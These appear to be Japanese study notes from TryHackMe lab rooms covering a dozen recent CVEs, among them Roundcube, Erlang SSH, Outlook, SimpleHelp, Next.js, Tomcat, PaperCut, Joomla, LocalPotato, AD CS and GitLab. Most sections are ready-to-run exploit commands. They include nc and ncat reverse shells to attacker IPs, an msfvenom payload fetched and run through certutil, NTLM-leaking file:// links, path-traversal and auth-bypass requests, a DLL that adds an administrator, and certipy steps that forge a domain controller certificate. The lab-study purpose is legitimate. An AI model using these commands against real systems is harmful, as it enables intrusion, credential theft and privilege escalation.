# CVE

## CVE-2025-49113 (Roundcube)

https://tryhackme.com/room/roundcubecve202549113

- [Roundcube](https://roundcube.net/) は、オープンソースウェブメールプロジェクト
- `1.5.x < 1.5.10`、`1.6.x < 1.6.11`
- RCE (Authenticated)

```sh
git clone https://github.com/fearsoff-org/CVE-2025-49113
cd CVE-2025-49113/

# 必ず成功するとは限らないので、何度か実行してみる。
php CVE-2025-49113.php http://10.10.220.172/roundcube <user> <password> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 4444 >/tmp/f"
```

## CVE-2025-32433

https://tryhackme.com/room/erlangotpsshcve202532433

https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py

- Erlang/OTP SSH
- 修正：OTP-27.3.3, OTP-26.2.5.11, or OTP-25.3.2.20.
- 認証情報不要

上記 URL の PoC は無害なファイルを作るだけ。

```
file:write_file("/lab.txt", <<"pwned">>)
```

os::cmd を使うことで、任意のコードを実行できる。

```
command='os:cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.85.243 6666 >/tmp/f").'
```

## CVE-2024-21413（Moniker Link）

https://tryhackme.com/room/monikerlink

https://github.com/CMNatic/CVE-2024-21413

- Outlook の脆弱性で、Windows netNTLMv2 hash を盗む。
- アプリケーションを指定するリンクをモニカーリンクという。
- ユーザーがリンクをクリックしたら、ローカル認証情報が指定した IP に送信される。

```sh
# 通常のモニカーリンクは保護ビューにブロックされる
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>

# 「!」文字を入れて、保護ビューをバイパスするリンク
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

## CVE-2024-57727 (SimpleHelp)

https://tryhackme.com/room/simplehelpcve202457727

- SimpleHelp <= v5.5.7
- パストラバーサルの脆弱性
- この他に、CVE-2024-57726、CVE-2024-57728 もある

```sh
git clone https://github.com/imjdl/CVE-2024-57727
cd CVE-2024-57727

# 脆弱性があるかどうか確認
python3 poc.py http://MACHINE_IP
```

Windows 用

```sh
# --path-as-is により、.. が正規化されなくなる
curl --path-as-is http://MACHINE_IP/toolbox-resource/../resource1/../../configuration/serverconfig.xml
```

Linux 用

```sh
# Linuxの場合、resource1 の部分を有効なディレクトリ名にする必要がある
curl --path-as-is http://MACHINE_IP/toolbox-resource/../secmsg/../../configuration/serverconfig.xml
```

secmsg 以外の候補 `alertsdb, backups, branding, history, html, notifications, recordings, remotework, simulations, sslconfig, techprefs, templates, toolbox, toolbox-resources, translations
`

## CVE-2025-29927 (Next.js)

https://tryhackme.com/room/nextjscve202529927

- Next.js < 15.2.3, 14.2.25, 13.5.9, 12.3.5
- ミドルウェアベースの認証バイパスの脆弱性
- HTTP ヘッダーを追加するだけ

```sh
curl -H "x-middleware-subrequest: middleware" http://10.10.234.130:3000/protected
```

## CVE-2024-50379 (Tomcat)

https://tryhackme.com/room/tomcatcve202450379

- Apache Tomcat `11.0.0-M1 ~ 11.0.1`, `10.1.0-M1 ~ 10.1.33`, `9.0.0-M1 ~ 9.0.97`
- Time-of-check-Time-of-use（TOCTOU）脆弱性
- 大文字と小文字を区別しないシステム（Windows, macOS）において、デフォルトサーブレットに書き込み権限がある場合、JSP（Java Server Page）のコンパイル時に TOCTOU 競合状態が発生する。

書き込み権限があるとは、サーバーが PUT や DELETE などの HTTP コマンドを受け入れるように設定されていること。

```xml
<servlet>
  <servlet-name>default</servlet-name>
  <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
  <init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
  </init-param>
</servlet>
```

Linux では、demo.jsp と demo.Jsp は同じディレクトリに共存できるため成立しない。

Windows では、Tomcat は demo.jsp をサーブレットとして、demo.Jsp をテキストファイルとして扱う。

```sh
# これはエラーになる
curl -X PUT -d "test" http://10.10.87.31:8080/demo.jsp

# これはアップロード成功する（通常はテキストファイルとして扱われるので実行はされない）
curl -X PUT -d "test" http://10.10.87.31:8080/demo.Jsp
```

Jsp の PUT と jsp の GET が大量にリクエストされて高負荷になった場合、競合により Jsp がサーブレットとして実行される可能性がある。

```sh
git clone https://github.com/iSee857/CVE-2024-50379-PoC
```

```java
payload_put = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c start ncat -e cmd.exe 10.10.54.182 8888\"); %>"
```

## CVE-2024-10924 (Really Simple Security)

https://tryhackme.com/room/bypassreallysimplesecurity

- WordPress の Really Simple Security プラグインの認証バイパス脆弱性
- 9.0.0 ~ 9.1.1.1
- プラグインの 2 要素認証（2FA）メカニズム用に設定された REST API エンドポイントが標的
- 2FA が有効になっているアカウントにのみ影響する

```python
url = "http://vulnerablewp.thm:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),  # User ID from the argument
    "login_nonce": "invalid_nonce",  # Arbitrary value
    "redirect_to": "/wp-admin/"  # Target redirection
}

response = requests.post(url, json=data)
```

返ってきた Cookie をブラウザに設定すると、認証済状態になる。

## CVE-2023-27350 (PaperCut)

https://tryhackme.com/room/papercut

- PaperCut < `20.1.7`, `21.2.11`, `22.0.9`
- 認証バイパスの脆弱性。
- 管理コンソールにスクリプト機能があり RCE につながる。
- サンドボックス設定を無効にすると、スクリプトが Java ランタイムに直接アクセスできる。
- PrintCut サービスは、NT AUTHORITY\SYSTEM または root ユーザーで実行される。

認証バイパス方法は、下記 URL にアクセスするだけ。

`http://<ip>:9191/app?service=page/SetupCompleted`

その後、`Printers -> Template printer -> Scripting -> Enable print script` を有効化する。

下記のようにコマンドを実行できる。

```js
function printJobHook(inputs, actions) {
  // your script here
}
java.lang.Runtime.getRuntime().exec("ping.exe ATTACKER_IP");
```

CLI でコマンド実行できるエクスプロイト

https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py

```sh
# リバースシェルを作成してHTTPサーバー起動
msfvenom -p windows/shell/reverse_tcp -f exe LHOST=ATTACKER_IP LPORT=4444 -o shell.exe
python3 -m http.server 8080

# リバースシェルのリッスン
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"

# ダウンロード＆実行
python3 CVE-2023-27350.py -u http://10.10.210.29:9191 -c "certutil.exe -urlcache -f http://ATTACKER_IP:8080/shell.exe shell.exe"
python3 CVE-2023-27350.py -u http://10.10.210.29:9191 -c "cmd.exe /c shell.exe"
```

## CVE-2023-23752 (Joomify)

https://tryhackme.com/room/joomify

- Joomla! `4.0.0 ~ 4.2.7`
- Joomla! は、第 5 位のコンテンツ管理システム（CMS）
- API エンドポイントで GET パラメータの public を true にすることで認証なしでアクセスできるようになる。
- 情報漏洩の脆弱性で、重大度は Medium。

api 配下のフォルダ構造を脆弱性のあるバージョンをダウンロードして調べることが可能。  
https://downloads.joomla.org/cms/joomla4/4-1-0

API リスト  
https://docs.joomla.org/J4.x:Joomla_Core_APIs

エクスプロイト

```sh
# アプリケーション設定（DB接続情報など）
curl -v http://10.10.120.177/api/index.php/v1/config/application?public=true

# ユーザー
curl -v http://10.10.120.177/api/index.php/v1/users?public=true
```

## CVE-2023-21746 (LocalPotato)

https://tryhackme.com/room/localpotato

https://github.com/decoder-it/LocalPotato

- 2023 年 1 月の月例パッチで修正済
- ターゲットマシンに任意のファイルを書き込むことが出来る脆弱性。
- [DLL ハイジャック（LPE via StorSvc）](https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc)と組み合わせることで、権限昇格を実現する。

`SprintCSP.dll` `RpcClient.exe` のコンパイルが必要。

### 準備

#### RpcClient.exe

storsvc_c.c

```c
#define WIN10
//#define WIN11
//#define WIN2019
//#define WIN2022
```

#### SprintCSP.dll

main.c

例：現在のユーザーを管理者グループに追加する。

```c
void DoStuff() {

    // Replace all this code by your payload
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators user /add",
        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return;
}
```

### エクスプロイト

```ps
# PATHの確認
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -v Path

# いずれかのPATHにコピーする必要があるが、権限不足でエラーになるので
copy SprintCSP.dll C:\Windows\System32\SprintCSP.dll

# LocalPotato を使ってコピーする
LocalPotato.exe -i SprintCSP.dll -o \Windows\System32\SprintCSP.dll

# RPCをトリガー
RpcClient.exe

# 確認
net user user
```

## CVE-2022-26923 (ActiveDirectory 証明書サービス (CS))

https://tryhackme.com/room/cve202226923

- 構成ミスのある証明書テンプレートを悪用することで、権限昇格やラテラルムーブメント（横方向の攻撃）が可能
- `Validate write to DNS hostname`, `Validate write to Service Principal Name (SPN)` の 2 つの権限が付与されている場合に脆弱性がある。

### ステップ

1. 権限の低い AD ユーザーの資格情報を侵害します。
2. これらの資格情報を使用して、ドメインに新しいホストを登録します。
3. コンピュータ AD オブジェクトの DNS ホスト名属性を、ドメイン コントローラなどの特権ホストの属性に変更します。
4. 固有の SPN 競合の問題を回避するために、SPN 属性を削除します。
5. デフォルトのテンプレートを使用してマシン証明書を要求します。
6. 受信したテンプレートを使用して、偽のマシン アカウントではなく特権マシン アカウントとして Kerberos 認証を実行します。

### エクスプロイト

/etc/hosts（kali）

```sh
10.10.254.197 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca.com
```

https://github.com/ly4k/Certipy

```sh
# 権限の低いADユーザーの証明書
certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User

# 証明書確認
certipy auth -pfx thm.pfx

# ドメインにコンピュータを追加（impacket）
addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'

# コンピュータの証明書
certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine

# 確認
certipy auth -pfx thmpc.pfx
```

```ps
# SPNを削除してからDNSホスト名をDCに変更
#（先にSPNを削除しないと、ホスト名変更によりSPNが自動変更され、SPN重複により変更失敗する）
Set-ADComputer THMPC -ServicePrincipalName @{}
Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
```

```sh
# 証明書偽造
certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine

# DC のNTLMハッシュが返る
certipy auth -pfx lundc.pfx
```

## CVE-2023-7028 (GitLab)

https://tryhackme.com/room/gitlabcve20237028

- `16.1~16.1.5`、`16.2~16.2.8`、`16.3~16.3.6`、`16.4~16.4.4`、`16.5~16.5.5`、`16.6~16.6.3`、`16.7~16.7.1`
- パスワードリセットメールを自分のアドレスに送信させ、任意のユーザーのパスワードをリセットできる。

poc（THM のリンクに修正版のコードがある）  
https://github.com/Vozec/CVE-2023-7028/blob/main/CVE-2023-7028.py

```sh
python3 attack.py -u http://10.10.207.254:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
```
